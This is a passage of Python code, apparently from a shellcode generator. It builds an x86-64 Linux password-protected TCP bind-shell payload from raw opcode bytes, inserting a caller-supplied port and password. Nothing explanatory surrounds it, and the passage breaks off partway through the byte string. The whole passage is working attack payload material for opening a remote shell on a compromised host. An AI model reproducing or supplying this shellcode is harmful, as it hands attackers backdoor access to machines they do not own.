...
def tcp_bind( PORT,PASSWORD):
	shellcode =  r"\x6a\x61\x58\x6a\x02\x5f\x6a\x01\x5e\x99"
	shellcode += r"\x0f\x05\x48\x97\xba\xff\x02"
	shellcode += PORT
	shellcode += r"\x80\xf2\xff\x52\x48\x89\xe6\x99\x04\x66\x80"
	shellcode += r"\xc2\x10\x0f\x05\x04\x6a\x0f\x05\x04\x1e"
	shellcode += r"\x48\x31\xf6\x99\x0f\x05\x48\x97\x6a\x03"
	shellcode += r"\x58\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10"
	shellcode += r"\x0f\x05\x48\xb8"
	#R2CBw0crw
	#"\x52\x32\x43\x42\x77\x30\x63\x72"
	shellcode += PASSWORD
	shellcode += r"\x57\x48\x8d\x3e\x48\xaf\x74\x08"
	shellcode += r"\x48\x31\xc0\x48\xff\xc0\x0f\x05\x5f\x48"
	shellcode += r"\x89\xd0\x48\x89\xfe\x48\xff\xce\xb0\x5a"
	shellcode += r"\x0f\x05\x75\xf7\x99\x04\x3b\x48\xbb\x2f"
